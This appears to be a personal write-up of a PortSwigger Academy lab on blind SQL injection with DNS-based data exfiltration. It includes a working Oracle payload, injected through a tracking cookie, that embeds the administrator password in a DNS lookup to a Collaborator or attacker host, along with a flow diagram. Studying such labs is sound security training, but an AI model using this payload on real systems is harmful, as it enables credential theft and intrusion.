# Lab 17 — Blind SQL Injection with Out-of-Band Data Exfiltration

**Difficulty:** Expert
**Technique:** Out-of-band SQLi — credential exfiltration via DNS
**Lab URL:** https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

---

## Vulnerability

The application is vulnerable to blind SQL injection via a tracking cookie. Building on Lab 16 (which established the OOB channel), this lab exfiltrates actual data — the administrator password — through the DNS channel by embedding it directly in the DNS lookup hostname.

---

## Steps Taken

1. Confirmed OOB interaction as established in Lab 16
2. Modified the payload to include a SQL query for the administrator password within the DNS hostname
3. The database executed the query, retrieved the password, and concatenated it into the DNS lookup URL
4. Observed the DNS interaction at Burp Collaborator — the password appeared as a subdomain
5. Extracted the password from the DNS log and logged in as administrator

---

## Payload Used (Oracle)

```
TrackingId=xyz'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-URL/"> %remote;]>'),'/l')+FROM+dual--
```

**What this does:**
- `SELECT password FROM users WHERE username='administrator'` retrieves the password
- `||` concatenates the password into the DNS hostname
- Database makes a DNS request to: `[password].BURP-COLLABORATOR-URL`
- Password extracted directly from the DNS log — never visible in the application response

---

## The DNS Exfiltration Flow

```
Database server
      ↓ executes SQL, gets password
      ↓ constructs DNS hostname: password.attacker-server.com
      ↓ makes DNS lookup
DNS Server logs the request
      ↓
Attacker reads password from Burp Collaborator DNS log
```

---

## Real-World Impact

Complete credential extraction with zero visible output, no error messages, no timing differences, and no behavioural changes. The only evidence is a DNS request leaving the database server — which many organisations do not monitor.

---

## Key Takeaway

Data exfiltration does not require the application to display anything. Once injection exists and the database server has outbound network access, an attacker can extract the entire database through DNS — invisible to application-layer monitoring.
